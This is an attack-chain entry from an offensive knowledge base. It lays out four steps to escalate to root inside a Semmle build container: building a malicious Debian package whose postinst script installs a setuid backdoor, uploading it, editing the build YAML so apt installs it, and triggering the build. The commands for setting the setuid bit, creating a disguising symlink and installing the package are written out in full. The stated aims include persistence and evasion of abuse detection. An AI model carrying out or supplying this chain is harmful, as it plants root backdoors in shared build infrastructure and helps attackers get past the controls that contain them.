---
tags:
  - privilege-escalation
  - setuid
  - debian-package
  - container-escape
  - build-process
  - semmle
type: attack_chain
tools:
  - '[[tools/Metasploit]]'
tactics:
  - '[[Privilege Escalation]]'
  - '[[Execution]]'
verified: false
platforms:
  - Linux
  - Container
  - Debian
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Malicious-Debian-Package-with-Setuid-Backdoor]]'
  - '[[procedures/Upload-Malicious-Package-and-Source-Code-to-Build-Environment]]'
  - '[[procedures/Configure-Build-YAML-to-Install-Malicious-Package]]'
  - '[[procedures/Trigger-Build-Process-for-Privilege-Escalation]]'
step_count: 4
techniques:
  - '[[Setuid and Setgid]]'
  - '[[Dynamic Linker Hijacking]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:30:58.248Z'
description: >-
  Multi-stage attack exploiting Semmle's build process to install a malicious
  Debian package, leading to root privilege escalation within the container via
  a setuid binary.
skill_level: intermediate
impact_level: high
id: 2cfb5fb5-7602-4886-aa14-bfc605ef6e26
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Setuid and Setgid]]'
  - '[[Dynamic Linker Hijacking]]'
  - '[[Unix Shell]]'
---
# Privilege Escalation via Malicious Debian Package in Semmle Build Process

Multi-stage attack chain demonstrating a complete attack workflow exploiting the Semmle build process to achieve root access in a containerized environment.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Malicious Package] --> B[Upload to Build Env]
    B --> C[Configure Build Install]
    C --> D[Trigger Build and Escalate]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Metasploit]]
- Debian packaging tools (dpkg-deb, fakeroot)

### Target Environment

- Semmle build system with Java prepare step
- Containerized Linux (Debian-based)
- Access to upload source code and build configurations

### Initial Access Requirements

- Valid user credentials for Semmle repository
- Ability to trigger builds
- No prior root access needed, but authenticated upload required

## Detailed Attack Procedures

### Step 1: Create Malicious Debian Package
procedure: [[procedures/Create-Malicious-Debian-Package-with-Setuid-Backdoor]]

**Objective**: Build a .deb package with a postinst script that deploys a setuid binary for privilege escalation.

**Instructions**: Compile a C binary backdoor that executes commands as root via system(). Package it with a postinst script that copies the binary to a persistent location, sets root ownership and setuid permissions, creates a symlink, and tests execution. Reference guides like Offensive Security's Metasploit for binary trojan creation.

Use [[commands/ps-ef-list-processes]] for reconnaissance in the script:

```bash
ps -ef
```

Copy the binary with [[commands/sudo-cp-copy-binary]]:

```bash
sudo cp /opt/src/run /suidfs/passwd
```

Set ownership with [[commands/sudo-chown-root-binary]]:

```bash
sudo chown root:root /suidfs/passwd
```

Apply setuid permissions with [[commands/sudo-chmod-setuid-binary]]:

```bash
sudo chmod 04755 /suidfs/passwd
```

Create symlink with [[commands/ln-symlink-backdoor]]:

```bash
ln -s /suidfs/passwd /usr/bin/setpasswd
```

Test escalation with [[commands/setpasswd-id-background]]:

```bash
setpasswd id &
```

**Expected Output**: Package built as work.deb, binary deployed with setuid bit, initial id output showing root.

**Success Indicators**:
- .deb file created without errors
- Postinst script validates setuid setup

### Step 2: Upload Malicious Package and Source Code
procedure: [[procedures/Upload-Malicious-Package-and-Source-Code-to-Build-Environment]]

**Objective**: Place the malicious .deb and binary in the build directory for access during prepare step.

**Instructions**: Import source code via Semmle repository, ensuring the .deb is at /opt/src/work.deb and the run binary at /opt/src/run. This occurs before the prepare phase.

**Expected Output**: Files visible in /opt/src/ within the build container.

**Success Indicators**:
- Upload completes without validation errors
- Build environment confirms file presence

### Step 3: Configure Build to Install Malicious Package
procedure: [[procedures/Configure-Build-YAML-to-Install-Malicious-Package]]

**Objective**: Modify build YAML to trigger apt installation of the local .deb during prepare, followed by post-exploitation checks.

**Instructions**: Edit the java.prepare.packages section to run [[commands/apt-install-malicious-deb]]:

```bash
apt install -y --no-recommend /opt/src/work.deb
```

Add after_prepare steps: Append marker with [[commands/echo-pwned-log]]:

```bash
echo pwned >> /opt/out/snapshot/log/build.log
```

Demonstrate escalation with [[commands/setpasswd-id-execute]]:

```bash
/usr/bin/setpasswd 'id'
```

**Expected Output**: YAML config updated, installation command queued.

**Success Indicators**:
- Build config parses without syntax errors
- Prepare step includes apt command

### Step 4: Trigger Build Process for Privilege Escalation
procedure: [[procedures/Trigger-Build-Process-for-Privilege-Escalation]]

**Objective**: Execute the build to install the package, run postinst for escalation, and verify root access.

**Instructions**: Initiate the Semmle build. The prepare step installs the .deb, triggering postinst. Even if build fails, the setuid binary (/usr/bin/setpasswd) remains for root execution.

**Expected Output**: Build log shows 'pwned', id output as uid=0(root).

**Success Indicators**:
- Postinst executes without interruption
- setpasswd id returns root privileges
- Persistent backdoor accessible post-build

## Attack Chain Summary

### Key Achievements

1. Successful installation of untrusted local .deb via apt in prepare step
2. Deployment of setuid binary for root escalation
3. Evasion of abuse detection and potential DoS via undeletable files
4. Weakening of container defenses for further escape

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Setuid and Setgid]]
- [[Dynamic Linker Hijacking]]
- [[Unix Shell]]

### MITRE ATT&CK Tactics

- [[Privilege Escalation]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
